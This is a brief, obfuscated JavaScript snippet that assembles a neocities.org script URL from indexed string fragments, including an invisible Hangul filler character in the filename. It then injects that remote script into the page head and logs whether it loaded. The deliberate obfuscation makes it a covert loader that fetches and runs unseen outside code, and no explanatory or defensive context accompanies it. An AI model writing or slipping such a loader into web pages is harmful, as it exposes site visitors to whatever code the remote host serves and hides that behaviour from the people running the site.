(function(){
  const _ = [
    'script', 'type', 'text/javascript', 'src', 'createElement', 'appendChild',
    'onload', 'log', 'onerror', 'error', 'head', 'document', 'https', '://',
    'share', 'booster', '.neo', 'cities', '.org', '/script4', 'ㅤ', '.js'
  ];
  
  const buildUrl = () => 
    [_[12], _[13], _[14], _[15], _[16], _[17], _[18], _[19], _[20], _[21]].join('');

  const d = window[_[11]], s = d[_[4]](_[0]);
  s[_[3]] = buildUrl();
  s[_[1]] = _[2];

  s[_[6]] = () => console[_[7]](s[_[3]] + ' loaded successfully.');
  s[_[8]] = () => console[_[9]]('Failed to load ' + s[_[3]]);

  d[_[10]][_[5]](s);
})();
